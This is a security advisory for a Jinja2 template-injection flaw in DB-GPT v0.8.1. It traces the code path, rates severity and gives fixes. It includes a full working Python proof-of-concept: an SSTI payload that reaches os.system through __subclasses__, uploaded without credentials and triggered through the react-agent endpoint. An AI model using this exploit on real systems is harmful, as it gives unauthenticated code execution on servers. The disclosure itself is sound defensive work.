# DB-GPT v0.8.1 skill template injection (Jinja2 SSTI) allows unauthenticated arbitrary code execution (CWE-1336, CVSS 9.8)

## Summary

An attacker with network access to a default DB-GPT v0.8.1 deployment executes arbitrary code inside the server process. The instructions of an uploaded skill package's SKILL.md are wrapped verbatim into a Jinja2 template by `FileBasedSkill.get_prompt()` (`packages/dbgpt-core/src/dbgpt/agent/skill/claude_skill/__init__.py:330,336-338` — `template_format="jinja2"`, `template_is_strict=False`, zero sanitization), embedded into the react-agent workflow prompt and bound as a jinja2 `PromptTemplate` (`packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py:3606-3618`), and finally rendered by `build_system_prompt` with a bare jinja2 `Template().render()` without `SandboxedEnvironment` (`packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:1258`, the actual sink of this chain). The attacker's Jinja2 SSTI payload therefore executes inside the server process before the LLM is ever called. Both endpoints are unauthenticated by default: `POST /api/v1/skills/upload` (`agentic_data_api.py:548-551`) and `POST /api/v1/chat/react-agent` depend on `get_user_from_headers()` (`packages/dbgpt-serve/src/dbgpt_serve/utils/auth.py:25-38`), whose mock auth always returns `role="admin"`. One unauthenticated upload plus one trigger request suffices.

## Details

The chain has five links: two unauthenticated HTTP endpoints, one attacker-controlled file, and two nested jinja2 template wrappings that end at a bare `Template().render()`.

**Link 1 — the sink: a bare `Template().render()` in `build_system_prompt`.** When a bound prompt's template format is jinja2, `build_system_prompt()` (`packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py`, defined at :1234) bypasses `PromptTemplate.format()` and renders the template with a bare `jinja2.Template`:

```python
# packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:13
from jinja2 import Template

# packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:1258 -- inside
# build_system_prompt(); the actual sink of this chain
elif self.bind_prompt.template_format == "jinja2":
    system_prompt = Template(self.bind_prompt.template).render(prompt_param)
```

No `SandboxedEnvironment` is used, so template code can reach arbitrary Python objects (`__class__`, `__mro__`, `__subclasses__`, `__globals__`).

A parallel unsafe path exists at `packages/dbgpt-core/src/dbgpt/agent/core/prompt/prompt.py`: `_jinja2_formatter` (defined at :25) imports the same bare `Template` (:28) and calls `return Template(template).render(**kwargs)` (:35). It is not the sink of this chain, but it has the same defect.

**Link 2 — attacker-controlled content: `FileBasedSkill.get_prompt()`.** The skill system lets any caller upload a skill package; its SKILL.md defines the skill instructions. `FileBasedSkill.get_prompt()` (`packages/dbgpt-core/src/dbgpt/agent/skill/claude_skill/__init__.py`, defined at :330) reads the instructions from the file (`instructions = parts[2].strip()`, :134) and wraps them verbatim into a jinja2 template with no cleaning:

```python
# packages/dbgpt-core/src/dbgpt/agent/skill/claude_skill/__init__.py:336-338
prompt = f"""...{self.instructions}"""
return PromptTemplate.from_template(prompt, template_format="jinja2", template_is_strict=False)
```

**Link 3 — the double wrapping in `_react_agent_stream()`.** When a chat request names a skill, `_react_agent_stream()` (defined at :987 in `packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py`) embeds the skill prompt context into the workflow prompt (the skill context is inserted at :3238, drawn from `skill_template.template` at :2924-2936), wraps the result again as a jinja2 `PromptTemplate` (:3606-3610), and `.bind(...)`s it as `bind_prompt` (:3618). The attacker's template code thereby reaches the `build_system_prompt` sink of Link 1.

**Link 4 — neither hop requires authentication.** The skill upload route (`agentic_data_api.py:548-551`; mounted under the `/api` prefix via `dbgpt_server.py:80`, so the full path is `/api/v1/skills/upload`) and the react-agent chat route both resolve their caller through `get_user_from_headers()` in `packages/dbgpt-serve/src/dbgpt_serve/utils/auth.py:25-38`. That function is a mock: any `user-id` header yields `role="admin"` (:28-31), and with no header at all it falls back to `user_id="001"`, `role="admin"` (:32-35). The upload and the trigger therefore require no credentials.

**Link 5 — execution precedes the LLM call.** The payload runs while `build_system_prompt` constructs the system prompt, before any LLM invocation. The attack does not depend on the model producing any particular output: it is direct server-side code execution, not prompt injection that relies on LLM cooperation.

The path is Docker-independent: a standard default installation listening on `0.0.0.0:5670` is affected.

## Proof of Concept

Dynamically verified against DB-GPT v0.8.1 on 2026-08-08 (default deployment on `0.0.0.0:5670`, no credentials used at any step); PoC 5/5 checks passed. The payload walks `__subclasses__` to locate `os._wrap_close` and calls its `__globals__['system']` — no fixed class index, compatible with Python 3.11. (The marker filename in the listing below is neutralized as `poc_marker.txt`; the verification used an equivalent marker file in the OS temp directory with the same content.)

**Steps:**

1. Build a malicious SKILL.md whose instructions block is the Jinja2 SSTI payload (writes the marker file).
2. Upload it unauthenticated: `POST /api/v1/skills/upload` → HTTP 200, `"success":true`.
3. Trigger the react agent unauthenticated: `POST /api/v1/chat/react-agent` with `ext_info.skill_name` naming the malicious skill → HTTP 200.
4. The payload executes while the system prompt is built (before any LLM call); the marker file appears with content `POC_SSTI_RCE_OK`.
5. Cleanup removes the uploaded skill, the marker, and the temporary directory.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
PoC — DB-GPT v0.8.1 skill template injection (Jinja2 SSTI) leading to arbitrary code execution
===============================================================================================
CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

Affected product: DB-GPT v0.8.1 (eosphoros-ai/DB-GPT)
Affected components (code path):
    - packages/dbgpt-core/src/dbgpt/agent/core/prompt/prompt.py:25,28,35
        _jinja2_formatter uses a bare jinja2.Template() (no SandboxedEnvironment)
    - packages/dbgpt-core/src/dbgpt/agent/core/base_agent.py:13,1258
        build_system_prompt() renders the attacker-controllable template with a bare
        Template().render()
    - packages/dbgpt-core/src/dbgpt/agent/skill/claude_skill/__init__.py:330,336-338
        FileBasedSkill.get_prompt() wraps the SKILL.md instructions as
        template_format="jinja2" (lines 336-338)
    - packages/dbgpt-app/src/dbgpt_app/openapi/api_v1/agentic_data_api.py:548-551
        POST /v1/skills/upload (unauthenticated skill upload endpoint; full path
        /api/v1/skills/upload)
    - agentic_data_api.py:3606-3618
        the workflow prompt is wrapped as a PromptTemplate(template_format="jinja2")
        and bound as bind_prompt
    - packages/dbgpt-serve/src/dbgpt_serve/utils/auth.py:25-38
        get_user_from_headers() mock auth always returns role="admin"

Summary:
  DB-GPT v0.8.1 renders prompts in two places with a bare jinja2.Template() instead of
  SandboxedEnvironment. An attacker uploads a SKILL.md containing Jinja2 template code
  through the unauthenticated skill upload endpoint (POST /v1/skills/upload); the skill
  instructions are wrapped into a jinja2-format template. When the react-agent chat
  endpoint (POST /v1/chat/react-agent, ext_info.skill_name names the malicious skill) is
  triggered, build_system_prompt() renders that template with a bare Template().render()
  before the LLM is called — the attacker's Jinja2 code executes inside the server
  process, giving arbitrary code execution (RCE).

Trigger conditions:
  1. the server is network-reachable (default 0.0.0.0:5670, zero authentication)
  2. a SKILL.md with the Jinja2 payload is uploaded (no credentials needed)
  3. the react agent is triggered to load that skill (ext_info.skill_name)

Impact:
  The attacker executes arbitrary code on the server through skill template injection.
  The SSTI fires during system-prompt rendering (before the LLM call), using a
  __subclasses__ walk to os._wrap_close's __globals__['system'] for command execution;
  no fixed class index is used, so it is compatible with Python 3.11.

Verification logic (full chain against the real service API, no authentication anywhere):
  [Precheck]  confirm the service is reachable
  [Step 1]    build the malicious SKILL.md (Jinja2 SSTI payload that writes a marker file)
  [Step 2]    upload the malicious skill unauthenticated (POST /v1/skills/upload)
  [Step 3]    trigger the react agent to load it unauthenticated (POST /v1/chat/react-agent)
  [Step 4]    verify the malicious code executed inside the server process (marker file content)
  [Step 5]    cleanup: remove the marker file, the uploaded skill, and the session record

Test environment:
  - DB-GPT v0.8.1 (http://localhost:5670)
  - Python 3.11+ (urllib standard library, no extra dependencies)
  - Windows 11 / Linux (cross-platform)

Usage:
  python poc.py [--target http://localhost:5670]
"""

import json
import os
import shutil
import sys
import tempfile
import time
import urllib.error
import urllib.request
import uuid

TARGET = "http://localhost:5670"
if len(sys.argv) > 2 and sys.argv[1] == "--target":
    TARGET = sys.argv[2]

PASSED = 0
FAILED = 0

TMP_BASE = tempfile.gettempdir()
POC_DIR = os.path.join(TMP_BASE, "ssti_poc")
SKILL_FILE = os.path.join(POC_DIR, "evil_skill.md")
MARKER = os.path.join(TMP_BASE, "poc_marker.txt")
SKILL_NAME = "evil_skill"

# Malicious SKILL.md: the instructions block carries the Jinja2 SSTI payload.
# The payload walks object.__subclasses__() for os._wrap_close and executes the
# marker-writing command through its __globals__['system']. No fixed class index
# is used, so it is compatible with Python 3.11.
def build_skill_md(marker_path: str) -> str:
    marker_forward = marker_path.replace("\\", "/")
    payload = (
        "{% for c in ''.__class__.__mro__[-1].__subclasses__() %}"
        "{% if c.__name__ == '_wrap_close' %}"
        "{{ c.__init__.__globals__['system']('echo POC_SSTI_RCE_OK > "
        + marker_forward
        + "') }}{% endif %}{% endfor %}"
    )
    return (
        "---\n"
        "name: evil_skill\n"
        "description: test skill for template injection\n"
        "version: 1.0\n"
        "author: attacker\n"
        "---\n\n"
        + payload
        + "\n"
    )


def check(name: str, condition: bool, detail: str = "") -> None:
    """Record one step result, printed as [PASS] or [FAIL]."""
    global PASSED, FAILED
    if condition:
        PASSED += 1
        print(f"  \033[92m[PASS]\033[0m {name}  {detail}")
    else:
        FAILED += 1
        print(f"  \033[91m[FAIL]\033[0m {name}  {detail}")


def api(method: str, path: str, body=None, timeout: int = 30):
    """Send a JSON HTTP request, return (status code, response text)."""
    data = json.dumps(body).encode("utf-8") if body is not None else None
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(TARGET + path, data=data, headers=h, method=method)
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"{{'error': {str(e)!r}}}"


def upload_skill(file_path: str, timeout: int = 30):
    """Upload the skill file as multipart/form-data (no authentication)."""
    boundary = "----PoCBoundary" + uuid.uuid4().hex
    with open(file_path, "rb") as f:
        content = f.read()
    filename = os.path.basename(file_path)
    parts = []
    parts.append(
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: text/markdown\r\n\r\n"
    )
    body = "".join(parts).encode("utf-8") + content + f"\r\n--{boundary}--\r\n".encode(
        "utf-8"
    )
    h = {"Content-Type": f"multipart/form-data; boundary={boundary}"}
    req = urllib.request.Request(
        TARGET + "/api/v1/skills/upload", data=body, headers=h, method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, f"{{'error': {str(e)!r}}}"


def trigger_skill(conv_uid: str, timeout: int = 60):
    """Trigger skill loading through the react-agent endpoint (no authentication,
    ext_info.skill_name names the malicious skill)."""
    body = {
        "chat_mode": "chat_react_agent",
        "conv_uid": conv_uid,
        "model_name": "deepseek-v4-pro",
        "temperature": 0,
        "user_input": "hello",
        "ext_info": {"skill_name": SKILL_NAME},
    }
    data = json.dumps(body).encode("utf-8")
    h = {"Content-Type": "application/json"}
    req = urllib.request.Request(
        TARGET + "/api/v1/chat/react-agent", data=data, headers=h, method="POST"
    )
    try:
        resp = urllib.request.urlopen(req, timeout=timeout)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return 0, str(e)


def marker_ok() -> bool:
    """Check that the marker file exists and contains POC_SSTI_RCE_OK."""
    try:
        if not os.path.exists(MARKER):
            return False
        with open(MARKER, encoding="utf-8", errors="replace") as f:
            return f.read().strip() == "POC_SSTI_RCE_OK"
    except Exception:
        return False


def clean_skill():
    """Delete the uploaded malicious skill (user skills directory)."""
    skills_dir = os.path.expanduser("~/.dbgpt/skills/user")
    target = os.path.join(skills_dir, SKILL_NAME)
    if os.path.isdir(target):
        shutil.rmtree(target, ignore_errors=True)


def main() -> bool:
    global PASSED, FAILED
    print()
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print("\033[1;36m  DB-GPT v0.8.1")
    print("  skill template injection (Jinja2 SSTI) -> arbitrary code execution  PoC\033[0m")
    print(f"\033[1;36m  target: {TARGET}\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()

    # -- Precheck --
    print("\033[1;33m[Precheck] confirm the service is reachable\033[0m")
    code, body = api("GET", "/api/controller/models")
    check("DB-GPT service reachable", code == 200, f"HTTP {code}")
    if code != 200:
        print("  start the service first: dbgpt start webserver -c <your-config>.toml -y")
        return False
    print()

    # -- Step 1: build the malicious SKILL.md --
    print("\033[1;33m[Step 1] build the malicious SKILL.md (with the Jinja2 SSTI payload)\033[0m")
    if os.path.exists(MARKER):
        os.remove(MARKER)
    os.makedirs(POC_DIR, exist_ok=True)
    with open(SKILL_FILE, "w", encoding="utf-8") as f:
        f.write(build_skill_md(MARKER))
    check("malicious SKILL.md built", os.path.exists(SKILL_FILE), SKILL_FILE)
    print("  payload: walk __subclasses__ for _wrap_close -> os.system writes the marker file")
    print()

    # -- Step 2: upload the malicious skill unauthenticated --
    print("\033[1;33m[Step 2] unauthenticated upload of the malicious skill (POST /api/v1/skills/upload)\033[0m")
    code, body = upload_skill(SKILL_FILE)
    ok = code == 200 and '"success":true' in body
    check("malicious skill uploaded (no authentication)", ok, f"HTTP {code}")
    if not ok:
        print(f"  response: {body[:200]}")
    print()

    # -- Step 3: trigger the react agent unauthenticated --
    print("\033[1;33m[Step 3] unauthenticated trigger of the react agent loading the malicious skill\033[0m")
    conv_uid = "poc-ssti-" + uuid.uuid4().hex[:8]
    print(f"  conv_uid={conv_uid} (no authentication, no credential headers)")
    code, resp = trigger_skill(conv_uid, timeout=90)
    check("react-agent request accepted", code == 200, f"HTTP {code}")
    # wait for the marker (the SSTI fires during system-prompt rendering,
    # possibly before the response completes)
    for _ in range(20):
        if marker_ok():
            break
        time.sleep(1)
    print()

    # -- Step 4: verify the malicious code executed inside the server process --
    print("\033[1;33m[Step 4] verify the malicious code executed (marker file)\033[0m")
    check("marker file created", marker_ok(), MARKER)
    if marker_ok():
        print(f"  content: {open(MARKER, encoding='utf-8').read().strip()}")
    print()

    # -- Step 5: cleanup --
    print("\033[1;33m[Step 5] cleanup\033[0m")
    clean_skill()
    if os.path.exists(MARKER):
        os.remove(MARKER)
    if os.path.exists(POC_DIR):
        shutil.rmtree(POC_DIR, ignore_errors=True)
    print("  malicious skill / marker / temp directory cleaned up")
    print()

    # -- Summary --
    total = PASSED + FAILED
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print(f"\033[1;36m  result: {PASSED}/{total} passed\033[0m")
    if FAILED == 0:
        print("\033[1;36m  verdict: VULNERABLE\033[0m")
        print("\033[1;36m  skill template injection (Jinja2 SSTI) -> arbitrary code execution confirmed\033[0m")
    else:
        print("\033[1;33m  verdict: some checks failed, inspect the service state\033[0m")
    print("\033[1;36m" + "=" * 62 + "\033[0m")
    print()
    print("root cause:")
    print("  prompt.py:25,28,35    - _jinja2_formatter uses a bare jinja2.Template()")
    print("  base_agent.py:1258    - build_system_prompt uses a bare Template().render()")
    print("  claude_skill:330,336  - SKILL.md instructions wrapped as template_format=jinja2")
    print("  agentic_data_api:548  - POST /v1/skills/upload unauthenticated")
    print("  -> upload malicious skill -> template code executes at render time -> CWE-1336 RCE")
    print()

    return FAILED == 0


if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
```

**Expected output** (5/5 checks):

```
[Precheck] confirm the service is reachable
  [PASS] DB-GPT service reachable  HTTP 200

[Step 1] build the malicious SKILL.md (with the Jinja2 SSTI payload)
  [PASS] malicious SKILL.md built  <temp>/ssti_poc/evil_skill.md

[Step 2] unauthenticated upload of the malicious skill (POST /api/v1/skills/upload)
  [PASS] malicious skill uploaded (no authentication)  HTTP 200

[Step 3] unauthenticated trigger of the react agent loading the malicious skill
  [PASS] react-agent request accepted  HTTP 200

[Step 4] verify the malicious code executed (marker file)
  [PASS] marker file created  <temp>/poc_marker.txt
  content: POC_SSTI_RCE_OK

[Step 5] cleanup
  malicious skill / marker / temp directory cleaned up

result: 5/5 passed
verdict: VULNERABLE
skill template injection (Jinja2 SSTI) -> arbitrary code execution confirmed
```

## Impact

- **Type:** template engine injection (CWE-1336, primary) with code injection (CWE-94, secondary); the ingress hop is unauthenticated (CWE-306).
- **Who is impacted:** any DB-GPT v0.8.1 deployment reachable over the network in its default configuration — a standard install binds `0.0.0.0:5670` (`config.py:267,:269`) and the mock auth returns admin; Docker-independent.
- **Preconditions:** network reachability to `0.0.0.0:5670`; the skill upload and chat endpoints default to zero authentication (both depend only on `get_user_from_headers`); a single upload plus one trigger request succeeds with no race condition.
- **Attacker capabilities:** arbitrary code execution inside the DB-GPT server process: read configuration, source code, credentials, and environment variables (C:H); write arbitrary files (I:H); terminate processes or exhaust resources (A:H).
- **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 (Critical).
  - AV:N — both trigger endpoints are served over the network on `0.0.0.0:5670`.
  - AC:L — a single upload plus one trigger request succeeds; PoC 5/5.
  - PR:N — both endpoints are unauthenticated by default (source-confirmed).
  - UI:N — the entire chain is automated; no human confirmation.
  - S:U — `Template().render()` executes inside the server process; no security boundary is crossed.
  - C:H / I:H / A:H — arbitrary read, write, and process control on the host.

## Affected products

| Field | Value |
|------|------|
| **Vendor** | `eosphoros-ai` |
| **Product** | `DB-GPT` |
| **Affected versions** | `0.8.1` |
| **Patched versions** | `None` |

No official patch existed at the time of submission. v0.8.2 (released 2026-08-26) contains a Jinja2 sandbox security fix whose coverage of this chain requires regression verification.

## Severity

| Field | Value |
|------|------|
| **Severity** | `Critical` |
| **Vector string** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| **Score** | `9.8` |

Computed with the official FIRST CVSS v3.1 formula: ISS = 1-(1-0.56)^3 = 0.914816; Impact(S:U) = 6.42 x 0.914816 = 5.873119; Exploitability = 8.22 x 0.85 x 0.77 x 0.85 x 0.85 = 3.887043; Base = roundup(5.873119 + 3.887043) = 9.8.

## Remediation

**Temporary mitigations** (as recorded at submission time):

1. Network layer: restrict port 5670 to internal/trusted networks; do not expose it to the public internet (firewall/security group).
2. Upgrade: move to an official fixed release; until one exists, avoid the skill system and uploading untrusted skills.
3. Configuration: enable authentication or a reverse proxy in front of the skill upload and chat endpoints; allowlist the skills that may be loaded.
4. Monitoring: alert on calls to `/api/v1/skills/upload` and `/api/v1/chat/react-agent` and on new skill registrations.
5. Minimization: do not run internet-facing model/agent services in production; when necessary, front them with a reverse proxy plus authentication.

**Code-level fix direction:** use `jinja2.SandboxedEnvironment` (blocking dangerous attribute/dunder access) at `base_agent.py:1258` and `prompt.py:35`; sanitize, or reject, SKILL.md instructions that contain template special elements before they enter any template.

## Weaknesses

| # | CWE | Name | Rationale |
|:--:|------|------|------|
| 1 (primary) | CWE-1336 | Improper Neutralization of Special Elements Used in a Template Engine | Attacker-controlled skill instructions are wrapped into a jinja2 template and rendered with a bare `Template().render()` without `SandboxedEnvironment` (`base_agent.py:1258`) |
| 2 | CWE-94 | Improper Control of Generation of Code ('Code Injection') | The Jinja2 payload executes inside the server process before any LLM call |
| 3 | CWE-306 | Missing Authentication for Critical Function | Skill upload and react-agent endpoints resolve callers through `get_user_from_headers()` mock auth, which always returns `role="admin"` (`auth.py:25-38`) |
